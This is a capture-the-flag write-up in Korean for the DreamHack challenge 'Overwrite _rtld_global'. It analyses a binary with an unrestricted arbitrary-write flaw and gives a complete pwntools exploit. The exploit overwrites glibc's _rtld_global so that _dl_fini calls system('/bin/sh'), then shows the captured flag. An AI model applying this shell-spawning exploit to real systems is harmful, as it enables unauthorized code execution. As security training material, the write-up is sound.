# [DreamHack] Overwrite _rtld_global

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: _rtld_global에서 실습하는 문제입니다.
>
> Release: [Overwrite _rtld_global.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8550046/Overwrite._rtld_global.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161366277-3cce3d89-4115-497a-b2fe-3e8de8e117af.png)

## Analysis

```c
int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
      	return 0;
    }
  }
  return 0;
}
```

`stdout`을 leak해준다. 이를 이용하여 libc와 ld 주소를 계산할 수 있다. AAW가 제한 없이 가능하므로, `_rtld_global` 구조체를 덮어써서 `system("/bin/sh")`를 호출하면 셸을 획득할 수 있다.

```
gdb-peda$ pd _dl_fini _dl_fini+106
Dump of assembler code from 0x7faca70e5b40 to 0x7faca70e5baa::  Dump of assembler code from 0x7faca70e5b40 to 0x7faca70e5baa:
   0x00007faca70e5b40 <_dl_fini+0>:     push   rbp
   0x00007faca70e5b41 <_dl_fini+1>:     mov    rbp,rsp
   0x00007faca70e5b44 <_dl_fini+4>:     push   r15
   0x00007faca70e5b46 <_dl_fini+6>:     push   r14
   0x00007faca70e5b48 <_dl_fini+8>:     push   r13
   0x00007faca70e5b4a <_dl_fini+10>:    push   r12
   0x00007faca70e5b4c <_dl_fini+12>:    push   rbx
   0x00007faca70e5b4d <_dl_fini+13>:    sub    rsp,0x28
   0x00007faca70e5b51 <_dl_fini+17>:    mov    r12,QWORD PTR [rip+0x219e08]        # 0x7faca72ff960 <_rtld_global+2304>
   0x00007faca70e5b58 <_dl_fini+24>:    sub    r12,0x1
   0x00007faca70e5b5c <_dl_fini+28>:    js     0x7faca70e5d85 <_dl_fini+581>
   0x00007faca70e5b62 <_dl_fini+34>:    mov    DWORD PTR [rbp-0x40],0x0
   0x00007faca70e5b69 <_dl_fini+41>:    lea    rbx,[r12+r12*8]
   0x00007faca70e5b6d <_dl_fini+45>:    lea    rax,[rip+0x2194ec]        # 0x7faca72ff060 <_rtld_global>
   0x00007faca70e5b74 <_dl_fini+52>:    shl    rbx,0x4
   0x00007faca70e5b78 <_dl_fini+56>:    add    rbx,rax
   0x00007faca70e5b7b <_dl_fini+59>:    jmp    0x7faca70e5ba2 <_dl_fini+98>
   0x00007faca70e5b7d <_dl_fini+61>:    nop    DWORD PTR [rax]
   0x00007faca70e5b80 <_dl_fini+64>:    lea    rdi,[rip+0x219de1]        # 0x7faca72ff968 <_rtld_global+2312>
   0x00007faca70e5b87 <_dl_fini+71>:    call   QWORD PTR [rip+0x21a3db]        # 0x7faca72fff68 <_rtld_global+3848>
   0x00007faca70e5b8d <_dl_fini+77>:    sub    r12,0x1
   0x00007faca70e5b91 <_dl_fini+81>:    sub    rbx,0x90
   0x00007faca70e5b98 <_dl_fini+88>:    cmp    r12,0xffffffffffffffff
   0x00007faca70e5b9c <_dl_fini+92>:    je     0x7faca70e5d70 <_dl_fini+560>
   0x00007faca70e5ba2 <_dl_fini+98>:    lea    rdi,[rip+0x219dbf]        # 0x7faca72ff968 <_rtld_global+2312>
   0x00007faca70e5ba9 <_dl_fini+105>:   call   QWORD PTR [rip+0x21a3b1]        # 0x7faca72fff60 <_rtld_global+3840>
End of assembler dump.
```

`main` 함수가 리턴되고 나서 호출되는 `_dl_fini` 함수를 보면, `_dl_fini+98`에서 `_rtld_global+2312`를 인자로 받아서, `_dl_fini+105`에서 `__rtld_global+3840`에 저장된 주소를 호출한다. 각각을 `"/bin/sh"`의 주소와 `system` 함수의 주소로 덮으면 된다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/ow_rtld/ow_rtld')
    stdout_offset = 0x3ec760
    system_offset = 0x4f420
    ld_offset = 0x3f1000
    rtld_global_offset = 0x22a060
else:
    r = remote('host1.dreamhack.games', 17593)
    stdout_offset = 0x3ec760
    system_offset = 0x4f550
    ld_offset = 0x3f1000
    rtld_global_offset = 0x22a060

sla = r.sendlineafter


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
ld = libc + ld_offset  # ld base
rtld_global = ld + rtld_global_offset  # _rtld_global


# overwrite _rtld_global+2312 with "/bin/sh"

sla('> ', '1')
sla('addr: ', str(rtld_global + 2312))
sla('data: ', str(u64('/bin/sh\x00')))


# overwrite _rtld_global+3840 with system()

sla('> ', '1')
sla('addr: ', str(rtld_global + 3840))
sla('data: ', str(system))


# call system("/bin/sh")

sla('> ', '0')


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 17593: Done
[*] Switching to interactive mode
$ cat flag
DH{2883ffb28842d85677f75c328da85cd7}
```